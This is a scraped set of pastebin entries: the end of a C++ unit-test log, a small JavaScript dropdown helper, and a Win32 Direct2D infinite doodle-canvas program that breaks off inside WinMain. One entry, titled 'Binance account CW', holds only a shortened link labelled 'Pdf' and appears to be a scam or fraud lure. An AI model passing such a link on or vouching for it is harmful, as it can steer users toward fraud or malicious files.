 hint: os.str() != ""1.2.3.4.5.6.\n7.8.9.10.11.12.\n13.14.15.\n"", Paginator.cpp:89
TestModification OK
TestPageSizes OK
TestConstContainer OK
TestPagePagination OK
1 unit tests failed. Terminate
*/
"
iTbBXUJS,Untitled,Onesible,JavaScript,Thursday 27th of March 2025 12:45:47 PM CDT,"function solve() {
    let dropdown = document.getElementById('menu');
    document.querySelector('input[type=""submit""]').addEventListener('click', addOption);

    function addOption(e) {
        e.preventDefault();
        let text = document.getElementById('newItemText');
        let value = document.getElementById('newItemValue');

        let option = document.createElement('option');
        option.textContent = text.value;
        option.value = value.value;

        dropdown.appendChild(option);

        text.value = '';
        value.value = '';
    }
}"
qW6dVgPm,Binance account CW,BlastBiking,JavaScript,Thursday 27th of March 2025 12:42:01 PM CDT," 
Pdf https://tinyurl.com/methodssss


xKgRtNJawL
"
HfCqJGVJ,Infinite Doodle Canvas Direct2D Fix For ArrowKeys/Home Pan Update CanvasPosition!,alien_fx_fiend,C++,Thursday 27th of March 2025 12:39:15 PM CDT,"==++ Here's the full source code for (file 1/1) ""Doodle-D2D-HAcc.cpp""::: ++==

```Doodle-D2D-HAcc.cpp
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <commdlg.h>
#include <d2d1.h>
#include <dwrite.h>
#include <string>  // add if not already included
#include <cmath>
#include <vector>
#include <mutex>
#include <fstream>
#include <thread>
#include <algorithm>
#include ""resource.h""

#pragma comment(lib, ""d2d1.lib"")
#pragma comment(lib, ""comctl32.lib"")

//----------------------------------------------------------------
// Data Structures and Globals
//----------------------------------------------------------------

struct DrawPoint {
    int x, y;
    DWORD timestamp;
    DrawPoint() : x(0), y(0), timestamp(0) {}
    DrawPoint(int px, int py) : x(px), y(py), timestamp(GetTickCount()) {}
};

struct SerializedStroke {
    std::vector<DrawPoint> points;
    COLORREF color;
    int brushSize;
    bool isEraser;
};

std::mutex strokeMutex;
std::vector<SerializedStroke> strokeHistory;
std::vector<DrawPoint> strokeBuffer;
const double MIN_DISTANCE = 2.0;

COLORREF currentBrushColor = RGB(24, 123, 205);
int brushSize = 10;
int currentStrokeBrushSize = 10;
bool isDrawing = false;
bool isEraserMode = false;
bool isPaintbrushSelected = true;
bool isSpacePressed = false;
POINT lastMousePos = { 0, 0 };

int scrollX = 0;
int scrollY = 0;
float gridZoomFactor = 1.0f;
bool showGrid = true;
bool useAlphaGrid = false;
int gridOpacity = 255;
// Global view transform for panning.
D2D1_MATRIX_3X2_F g_viewTransform = D2D1::Matrix3x2F::Identity();
const int GRID_SIZE = 100;

HINSTANCE hInst;
HWND hWnd;
//HWND hStatusBar = NULL;
// Global DirectWrite objects:
IDWriteFactory* pDWriteFactory = nullptr;
IDWriteTextFormat* pTextFormat = nullptr;
std::wstring g_statusText = L"""";
// Add DirectWrite globals and a global status string:
//IDWriteFactory* pDWriteFactory = nullptr;
//IDWriteTextFormat* pTextFormat = nullptr;
DWORD lastStatusUpdateTime = 0;
const DWORD STATUS_UPDATE_INTERVAL = 50;
HDC hStatusBufferDC = NULL;
HBITMAP hStatusBufferBitmap = NULL;

// Serialization globals
const wchar_t* STATE_FILE = L""canvas_state2.bin"";
bool isLoading = false;
bool sessionDirty = false;

// For Direct2D
ID2D1Factory* pFactory = nullptr;
ID2D1HwndRenderTarget* pRenderTarget = nullptr;
ID2D1BitmapRenderTarget* pOffscreenRT = nullptr;
bool offscreenDirty = true;
int lastOffscreenScrollX = 0;
int lastOffscreenScrollY = 0;

//----------------------------------------------------------------
// Function Declarations
//----------------------------------------------------------------

void SaveCanvasState();
void LoadCanvasStateAsync(HWND hwnd);
void UpdateStatus(HWND hwnd);
void InitializeStatusBuffer(HWND hStatus);
void UpdateOffscreenBuffer(HWND hwnd);
HRESULT CreateDeviceResources(HWND hwnd);
void DiscardDeviceResources();
void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY);
void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect);

//----------------------------------------------------------------
// Serialization Functions
//----------------------------------------------------------------

void SaveCanvasState() {
    std::ofstream file(STATE_FILE, std::ios::binary | std::ios::out);
    if (!file)
        return;
    file.write(reinterpret_cast<const char*>(&gridZoomFactor), sizeof(float));
    file.write(reinterpret_cast<const char*>(&showGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&useAlphaGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&gridOpacity), sizeof(int));
    file.write(reinterpret_cast<const char*>(&currentBrushColor), sizeof(COLORREF));
    file.write(reinterpret_cast<const char*>(&brushSize), sizeof(int));
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        size_t strokeCount = strokeHistory.size();
        file.write(reinterpret_cast<const char*>(&strokeCount), sizeof(size_t));
        for (const auto& stroke : strokeHistory) {
            std::vector<DrawPoint> optimizedPoints;
            if (!stroke.points.empty()) {
                optimizedPoints.push_back(stroke.points[0]);
                for (size_t i = 1; i < stroke.points.size(); ++i) {
                    const DrawPoint& prev = optimizedPoints.back();
                    const DrawPoint& curr = stroke.points[i];
                    double dx = curr.x - prev.x;
                    double dy = curr.y - prev.y;
                    double distance = sqrt(dx * dx + dy * dy);
                    if (distance >= MIN_DISTANCE)
                        optimizedPoints.push_back(curr);
                }
            }
            size_t pointCount = optimizedPoints.size();
            file.write(reinterpret_cast<const char*>(&pointCount), sizeof(size_t));
            if (pointCount > 0)
                file.write(reinterpret_cast<const char*>(optimizedPoints.data()), pointCount * sizeof(DrawPoint));
            file.write(reinterpret_cast<const char*>(&stroke.color), sizeof(COLORREF));
            file.write(reinterpret_cast<const char*>(&stroke.brushSize), sizeof(int));
            file.write(reinterpret_cast<const char*>(&stroke.isEraser), sizeof(bool));
        }
    }
    file.close();
}

void LoadCanvasStateAsync(HWND hwnd) {
    isLoading = true;
    std::thread([hwnd]() {
        std::ifstream file(STATE_FILE, std::ios::binary | std::ios::in);
        if (!file) {
            isLoading = false;
            return;
        }
        try {
            file.read(reinterpret_cast<char*>(&gridZoomFactor), sizeof(float));
            file.read(reinterpret_cast<char*>(&showGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&useAlphaGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&gridOpacity), sizeof(int));
            file.read(reinterpret_cast<char*>(&currentBrushColor), sizeof(COLORREF));
            file.read(reinterpret_cast<char*>(&brushSize), sizeof(int));
            size_t strokeCount = 0;
            file.read(reinterpret_cast<char*>(&strokeCount), sizeof(size_t));
            std::vector<SerializedStroke> loadedStrokes;
            for (size_t i = 0; i < strokeCount && file.good(); ++i) {
                SerializedStroke stroke;
                size_t pointCount = 0;
                file.read(reinterpret_cast<char*>(&pointCount), sizeof(size_t));
                if (pointCount > 0 && pointCount < 1000000) {
                    for (size_t j = 0; j < pointCount; ++j) {
                        DrawPoint point;
                        file.read(reinterpret_cast<char*>(&point.x), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.y), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.timestamp), sizeof(DWORD));
                        stroke.points.push_back(point);
                    }
                    file.read(reinterpret_cast<char*>(&stroke.color), sizeof(COLORREF));
                    file.read(reinterpret_cast<char*>(&stroke.brushSize), sizeof(int));
                    file.read(reinterpret_cast<char*>(&stroke.isEraser), sizeof(bool));
                    loadedStrokes.push_back(stroke);
                }
            }
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory = std::move(loadedStrokes);
            }
        }
        catch (...) {
            isLoading = false;
            return;
        }
        file.close();
        isLoading = false;
        // Post a message to update offscreen buffer after loading
        PostMessage(hwnd, WM_USER + 1, 0, 0);
        }).detach();
}

//----------------------------------------------------------------
// Direct2D Initialization and Resource Management
//----------------------------------------------------------------

HRESULT CreateDeviceResources(HWND hwnd) {
    if (pRenderTarget)
        return S_OK;
    RECT rc;
    GetClientRect(hwnd, &rc);
    D2D1_SIZE_U size = D2D1::SizeU(rc.right, rc.bottom);

    HRESULT hr = pFactory->CreateHwndRenderTarget(
        D2D1::RenderTargetProperties(),
        D2D1::HwndRenderTargetProperties(hwnd, size),
        &pRenderTarget
    );
    if (SUCCEEDED(hr)) {
        // Create an offscreen compatible render target for persistent drawing.
        hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rc.right, (FLOAT)rc.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr)) {
            // Mark offscreen as dirty so it is initially updated.
            offscreenDirty = true;
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
        }
    }
    return hr;
}

void DiscardDeviceResources() {
    if (pOffscreenRT) {
        pOffscreenRT->Release();
        pOffscreenRT = nullptr;
    }
    if (pRenderTarget) {
        pRenderTarget->Release();
        pRenderTarget = nullptr;
    }
}

//----------------------------------------------------------------
// Drawing Functions (Direct2D versions)
//----------------------------------------------------------------

void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY) {
    if (points.empty())
        return;

    // Determine color; for eraser use white.
    D2D1_COLOR_F color = isEraser ? D2D1::ColorF(D2D1::ColorF::White) :
        D2D1::ColorF(
            GetRValue(strokeColor) / 255.0f,
            GetGValue(strokeColor) / 255.0f,
            GetBValue(strokeColor) / 255.0f
        );

    ID2D1SolidColorBrush* pBrush = nullptr;
    if (FAILED(pRT->CreateSolidColorBrush(color, &pBrush)))
        return;

    if (points.size() == 1) {
        const DrawPoint& pt = points[0];
        D2D1_ELLIPSE ellipse = D2D1::Ellipse(
            D2D1::Point2F((FLOAT)(pt.x - offsetX), (FLOAT)(pt.y - offsetY)),
            (FLOAT)strokeSize, (FLOAT)strokeSize);
        pRT->FillEllipse(ellipse, pBrush);
    }
    else {
        for (size_t i = 1; i < points.size(); ++i) {
            const DrawPoint& prev = points[i - 1];
            const DrawPoint& curr = points[i];
            double dx = curr.x - prev.x;
            double dy = curr.y - prev.y;
            double distance = sqrt(dx * dx + dy * dy);
            if (distance > 0) {
                int steps = std::max(1, (int)(distance / 2));
                for (int step = 0; step <= steps; ++step) {
                    double t = step / (double)steps;
                    int x = (int)(prev.x + dx * t);
                    int y = (int)(prev.y + dy * t);
                    D2D1_ELLIPSE ellipse = D2D1::Ellipse(
                        D2D1::Point2F((FLOAT)(x - offsetX), (FLOAT)(y - offsetY)),
                        (FLOAT)strokeSize, (FLOAT)strokeSize);
                    pRT->FillEllipse(ellipse, pBrush);
                }
            }
        }
    }
    pBrush->Release();
}

void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect) {
    ID2D1SolidColorBrush* pGridBrush = nullptr;
    HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(1.0f, 0.55f, 0.0f), &pGridBrush);
    if (FAILED(hr)) return;
    int scaledGridSize = (int)(GRID_SIZE * gridZoomFactor);

    // Compute proper mod values so grid lines appear even for negative scrolls.
    int modX = scrollX % scaledGridSize;
    if (modX < 0)
        modX += scaledGridSize;
    // Determine starting X in world coordinates.
    float startX = (float)(scrollX - modX);
    int modY = scrollY % scaledGridSize;
    if (modY < 0)
        modY += scaledGridSize;
    float startY = (float)(scrollY - modY);

    // Draw vertical gridlines covering the rect.
    for (float x = startX; x < rect.right; x += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(x, rect.top), D2D1::Point2F(x, rect.bottom), pGridBrush, 1.0f);
    }
    // Draw horizontal gridlines covering the rect.
    for (float y = startY; y < rect.bottom; y += scaledGridSize) {
        pRT->DrawLine(D2D1::Point2F(rect.left, y), D2D1::Point2F(rect.right, y), pGridBrush, 1.0f);
    }
    pGridBrush->Release();
}

//----------------------------------------------------------------
// Offscreen Buffer Update (using pOffscreenRT)
//----------------------------------------------------------------

void UpdateOffscreenBuffer(HWND hwnd) {
    if (!pOffscreenRT)
        return;
    pOffscreenRT->BeginDraw();
    // Clear offscreen render target to white.
    pOffscreenRT->Clear(D2D1::ColorF(D2D1::ColorF::White));
    // Redraw all strokes.
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        for (const auto& stroke : strokeHistory) {
            DrawSmoothStroke(pOffscreenRT, stroke.points, stroke.isEraser, stroke.color, stroke.brushSize, scrollX, scrollY);
        }
    }
    HRESULT hr = pOffscreenRT->EndDraw();
    // Mark offscreen as clean.
    offscreenDirty = false;
    lastOffscreenScrollX = scrollX;
    lastOffscreenScrollY = scrollY;
}

//----------------------------------------------------------------
// Status Bar Functions (GDI remains unchanged)
//----------------------------------------------------------------

void InitializeStatusBuffer(HWND hStatus) {
    if (hStatusBufferDC) {
        DeleteDC(hStatusBufferDC);
        DeleteObject(hStatusBufferBitmap);
    }
    HDC hdc = GetDC(hStatus);
    RECT rect;
    GetClientRect(hStatus, &rect);
    hStatusBufferDC = CreateCompatibleDC(hdc);
    hStatusBufferBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
    SelectObject(hStatusBufferDC, hStatusBufferBitmap);
    ReleaseDC(hStatus, hdc);
}

void UpdateStatus(HWND hwnd) {
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s | Zoom: %.1fx | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        gridZoomFactor,
        scrollX, scrollY
    );
    g_statusText = status;
}

/* void UpdateStatus(HWND hwnd) {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastStatusUpdateTime < STATUS_UPDATE_INTERVAL)
        return;
    lastStatusUpdateTime = currentTime;
    if (!hStatusBar)
        return;
    if (!hStatusBufferDC) {
        InitializeStatusBuffer(hStatusBar);
    }
    RECT statusRect;
    GetClientRect(hStatusBar, &statusRect);
    wchar_t status[512];
    BYTE r = GetRValue(currentBrushColor);
    BYTE g = GetGValue(currentBrushColor);
    BYTE b = GetBValue(currentBrushColor);
    swprintf_s(status, 512,
        L""Mode: %s | Brush: %d | Color: RGB(%d,%d,%d) | Grid: %s%s | Zoom: %.1fx | Opacity: %d%% | Canvas Pos: (%d,%d)"",
        isEraserMode ? L""Eraser"" : L""Draw"",
        brushSize,
        r, g, b,
        showGrid ? L""On"" : L""Off"",
        useAlphaGrid ? L""(Alpha)"" : L"""",
        gridZoomFactor,
        (gridOpacity * 100) / 255,
        scrollX, scrollY
    );
    SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)status);
} */

//----------------------------------------------------------------
// Window Procedure
//----------------------------------------------------------------

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    HRESULT hr;
    switch (uMsg) {
    case WM_CREATE:
    {
        // Initialize Direct2D Factory
        HRESULT hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
        if (FAILED(hr))
            return -1;

        // Initialize DirectWrite Factory and Text Format for the status text.
        HRESULT hrDWrite = DWriteCreateFactory(
            DWRITE_FACTORY_TYPE_SHARED,
            __uuidof(IDWriteFactory),
            reinterpret_cast<IUnknown**>(&pDWriteFactory)
        );
        if (SUCCEEDED(hrDWrite))
        {
            hrDWrite = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"",                // Font family name.
                NULL,                       // Use system font collection.
                DWRITE_FONT_WEIGHT_NORMAL,
                DWRITE_FONT_STYLE_NORMAL,
                DWRITE_FONT_STRETCH_NORMAL,
                14.0f,                      // Font size.
                L"""",                        // Locale.
                &pTextFormat
            );
            if (SUCCEEDED(hrDWrite))
            {
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            }
        }

        // (Remove GDI status bar creation; status will be rendered via Direct2D.)

        // Device resources (pRenderTarget and pOffscreenRT) will be created in WM_SIZE.
        LoadCanvasStateAsync(hwnd);
        return 0;
    }
    case WM_SIZE:
    {
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);

        // Resize (or create) the main render target.
        if (pRenderTarget)
        {
            pRenderTarget->Resize(D2D1::SizeU(rcClient.right, rcClient.bottom));
        }
        else
        {
            HRESULT hr = CreateDeviceResources(hwnd);
            if (FAILED(hr))
                return -1;
        }

        // Recreate the offscreen render target.
        if (pOffscreenRT)
        {
            pOffscreenRT->Release();
            pOffscreenRT = nullptr;
        }
        HRESULT hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rcClient.right, (FLOAT)rcClient.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr))
        {
            offscreenDirty = true;               // Force update of the offscreen buffer.
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
            UpdateOffscreenBuffer(hwnd);         // Rebuild the offscreen content.
        }

        // Update status (which now contains the grid state) and force a full redraw.
        UpdateStatus(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        return 0;
    }
        case WM_KEYDOWN:
    {
            if (GetKeyState(VK_MENU) & 0x8000)
                return DefWindowProc(hwnd, uMsg, wParam, lParam);
            if (wParam == VK_LEFT) {
                scrollX -= 200; //default scroll for all arrowkeys = 20
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                UpdateStatus(hwnd);           // <-- Added this line
                InvalidateRect(hwnd, NULL, FALSE);
            }
            else if (wParam == VK_RIGHT) {
                scrollX += 200;
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                UpdateStatus(hwnd);           // <-- Added this line
                InvalidateRect(hwnd, NULL, FALSE);
            }
            else if (wParam == VK_UP) {
                scrollY -= 200;
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                UpdateStatus(hwnd);           // <-- Added this line
                InvalidateRect(hwnd, NULL, FALSE);
            }
            else if (wParam == VK_DOWN) {
                scrollY += 200;
                g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
                UpdateStatus(hwnd);           // <-- Added this line
                InvalidateRect(hwnd, NULL, FALSE);
            }
        else if (wParam == VK_SPACE && !isSpacePressed) {
            isSpacePressed = true;
            GetCursorPos(&lastMousePos);
            ScreenToClient(hwnd, &lastMousePos);
            SetCursor(LoadCursor(NULL, IDC_SIZEALL));
            SetCapture(hwnd);
        }
        else if (wParam == 0x50) {
            isPaintbrushSelected = true;
            isEraserMode = false;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 0x45) {
            isPaintbrushSelected = false;
            isEraserMode = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'Q') {
            CHOOSECOLOR cc = { sizeof(CHOOSECOLOR) };
            static COLORREF customColors[16] = { 0 };
            cc.hwndOwner = hwnd;
            cc.rgbResult = currentBrushColor;
            cc.lpCustColors = customColors;
            cc.Flags = CC_FULLOPEN | CC_RGBINIT;
            if (ChooseColor(&cc))
                currentBrushColor = cc.rgbResult;
            UpdateStatus(hwnd);
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_ADD || wParam == VK_OEM_PLUS) {
            brushSize = std::min(50, brushSize + 5);
            offscreenDirty = true;  // Ensure new brush size is applied in drawing.
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_SUBTRACT || wParam == VK_OEM_MINUS) {
            brushSize = std::max(5, brushSize - 5);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 0x43) {
            std::lock_guard<std::mutex> lock(strokeMutex);
            strokeHistory.clear();
            sessionDirty = true;  // Mark session as changed.
            offscreenDirty = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == VK_HOME) {
                scrollX = 0;
                scrollY = 0;
                g_viewTransform = D2D1::Matrix3x2F::Translation(0.0f, 0.0f);
                UpdateStatus(hwnd);  // <-- Add this line to update the status bar.
                InvalidateRect(hwnd, NULL, TRUE);
            }
        else if (wParam == 'G') {
            showGrid = !showGrid;
            offscreenDirty = true;  // Mark offscreen dirty so grid redraws.
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
        }
        else if (wParam == 'A') {
            useAlphaGrid = !useAlphaGrid;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_PRIOR) {
            gridZoomFactor *= 1.1f;
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_NEXT) {
            gridZoomFactor *= 0.9f;
            if (gridZoomFactor < 0.1f)
                gridZoomFactor = 0.1f;
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_6 && useAlphaGrid) {
            gridOpacity = std::min(255, gridOpacity + 15);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_OEM_4 && useAlphaGrid) {
            gridOpacity = std::max(0, gridOpacity - 15);
            offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (wParam == VK_ESCAPE) {
            if (isSpacePressed) {
                isSpacePressed = false;
                ReleaseCapture();
            }
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            PostQuitMessage(0);
            return 0;
        }
        else if (wParam == VK_F1) {
            MessageBox(hwnd,
                L""Infinite Canvas Doodle App (Direct2D Accelerated)\n""
                L""P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow Keys=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About Dream Come True! (877 lines of code) by Entisoft Software (c) Evans Thorpemorton Pen=24,123,205"",
                L""Information"", MB_OK | MB_ICONINFORMATION);
            return 0;
        }
        return 0;
    }
    case WM_KEYUP:
    {
        if (wParam == VK_SPACE) {
            isSpacePressed = false;
            SetCursor(LoadCursor(NULL, IDC_ARROW));
            ReleaseCapture();
            return 0;
        }
        return 0;
    }
    case WM_LBUTTONDOWN:
    {
        isDrawing = true;
        currentStrokeBrushSize = brushSize;
        int worldX = GET_X_LPARAM(lParam) + scrollX;
        int worldY = GET_Y_LPARAM(lParam) + scrollY;
        strokeBuffer.clear();
        strokeBuffer.push_back(DrawPoint(worldX, worldY));
        SetCapture(hwnd);
        InvalidateRect(hwnd, NULL, FALSE);
        return 0;
    }
    case WM_LBUTTONUP:
    {
        if (isDrawing) {
            isDrawing = false;
            SerializedStroke stroke;
            stroke.points = strokeBuffer;
            stroke.color = currentBrushColor;
            stroke.brushSize = brushSize;
            stroke.isEraser = isEraserMode;
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory.push_back(stroke);
            }
            strokeBuffer.clear();
            ReleaseCapture();
            InvalidateRect(hwnd, NULL, FALSE);
            sessionDirty = true;
            if (sessionDirty) {
                SaveCanvasState();
                sessionDirty = false;
            }
            offscreenDirty = true;
            UpdateOffscreenBuffer(hwnd);
            UpdateStatus(hwnd);
        }
        return 0;
    }
    case WM_MOUSEMOVE:
    {
        int x = GET_X_LPARAM(lParam);
        int y = GET_Y_LPARAM(lParam);
        if (isSpacePressed) {
            int deltaX = x - lastMousePos.x;
            int deltaY = y - lastMousePos.y;
            scrollX -= deltaX;
            scrollY -= deltaY;
            lastMousePos.x = x;
            lastMousePos.y = y;
            // Update the global view transform.
            g_viewTransform = D2D1::Matrix3x2F::Translation((FLOAT)-scrollX, (FLOAT)-scrollY);
            UpdateStatus(hwnd);  // <-- Added: update status after panning.
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (isDrawing && (wParam & MK_LBUTTON)) {
            int worldX = x + scrollX;
            int worldY = y + scrollY;
            if (strokeBuffer.empty())
                strokeBuffer.push_back(DrawPoint(worldX, worldY));
            else {
                const DrawPoint& lastPt = strokeBuffer.back();
                double dx = worldX - lastPt.x;
                double dy = worldY - lastPt.y;
                double distance = sqrt(dx * dx + dy * dy);
                if (distance >= MIN_DISTANCE)
                    strokeBuffer.push_back(DrawPoint(worldX, worldY));
            }
            RECT dirty;
            int clientPrevX = strokeBuffer.back().x - scrollX;
            int clientPrevY = strokeBuffer.back().y - scrollY;
            int clientNewX = x;
            int clientNewY = y;
            dirty.left = std::min(clientPrevX, clientNewX) - brushSize;
            dirty.top = std::min(clientPrevY, clientNewY) - brushSize;
            dirty.right = std::max(clientPrevX, clientNewX) + brushSize;
            dirty.bottom = std::max(clientPrevY, clientNewY) + brushSize;
            InvalidateRect(hwnd, &dirty, FALSE);
        }
        return 0;
    }
    case WM_USER + 1:
    {
        // Custom message after state loading.
        offscreenDirty = true;
        UpdateOffscreenBuffer(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        break;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hwnd, &ps);

        pRenderTarget->BeginDraw();

        // Clear to white.
        pRenderTarget->Clear(D2D1::ColorF(D2D1::ColorF::White));

        // Set transform for panning (world coordinates).
        pRenderTarget->SetTransform(g_viewTransform);

        // Draw all strokes in world coordinates.
        {
            std::lock_guard<std::mutex> lock(strokeMutex);
            for (const auto& stroke : strokeHistory) {
                DrawSmoothStroke(pRenderTarget, stroke.points, stroke.isEraser, stroke.color, stroke.brushSize, 0, 0);
            }
        }
        if (isDrawing && !strokeBuffer.empty()) {
            DrawSmoothStroke(pRenderTarget, strokeBuffer, isEraserMode, currentBrushColor, currentStrokeBrushSize, 0, 0);
        }

        // Draw grid in world coordinates.
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);
        D2D1_RECT_F worldRect = D2D1::RectF((FLOAT)scrollX, (FLOAT)scrollY,
            (FLOAT)(scrollX + rcClient.right), (FLOAT)(scrollY + rcClient.bottom));
        if (showGrid) {
            DrawGrid(pRenderTarget, worldRect);
        }

        // Reset transform to identity for UI.
        pRenderTarget->SetTransform(D2D1::Matrix3x2F::Identity());

        // Draw status bar in screen coordinates.
        D2D1_RECT_F statusRect = D2D1::RectF(0, (FLOAT)rcClient.bottom - 30.0f, (FLOAT)rcClient.right, (FLOAT)rcClient.bottom);
        ID2D1SolidColorBrush* pStatusBgBrush = nullptr;
        pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(0.2f, 0.2f, 0.2f), &pStatusBgBrush);
        pRenderTarget->FillRectangle(statusRect, pStatusBgBrush);
        pStatusBgBrush->Release();
        ID2D1SolidColorBrush* pTextBrush = nullptr;
        pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pTextBrush);
        pRenderTarget->DrawTextW(
            g_statusText.c_str(),
            static_cast<UINT32>(g_statusText.length()),
            pTextFormat,
            &statusRect,
            pTextBrush,
            D2D1_DRAW_TEXT_OPTIONS_NONE,
            DWRITE_MEASURING_MODE_NATURAL
        );
        pTextBrush->Release();

        HRESULT hr = pRenderTarget->EndDraw();
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_SETCURSOR:
    {
        if (LOWORD(lParam) == HTCLIENT) {
            if (isSpacePressed) {
                SetCursor(LoadCursor(NULL, IDC_SIZEALL));
                return TRUE;
            }
            else if (isPaintbrushSelected || isEraserMode) {
                SetCursor(LoadCursor(NULL, IDC_CROSS));
                return TRUE;
            }
        }
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    case WM_DESTROY:
    {
        if (sessionDirty)
        {
            SaveCanvasState();
            sessionDirty = false;
        }
        DiscardDeviceResources();
        if (pFactory)
        {
            pFactory->Release();
            pFactory = nullptr;
        }
        if (pTextFormat)
        {
            pTextFormat->Release();
            pTextFormat = nullptr;
        }
        if (pDWriteFactory)
        {
            pDWriteFactory->Release();
            pDWriteFactory = nullptr;
        }
        PostQuitMessage(0);
        return 0;
    }
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

//----------------------------------------------------------------
// WinMain
//----------------------------------------------------------------

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_BAR_CLASSES };
    InitCommonControlsEx(&icex);
    const wchar_t CLASS_NAME[] = L""InfiniteCanvasClass"";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
    RegisterClass(&wc);
    hInst = hInstance;
    hWnd = CreateWindowEx(0, CLASS_NAME,
        L""Infinite Canvas Doodle App (Direct2D Accelerated, P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About)"",
        WS_OVERLAPPEDWINDOW | WS_MAXIMIZE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, hInstance, NULL);
    if (hWnd == NULL)
        return 0;
    // Enable double buffering via WS_EX_COMPOSITED.
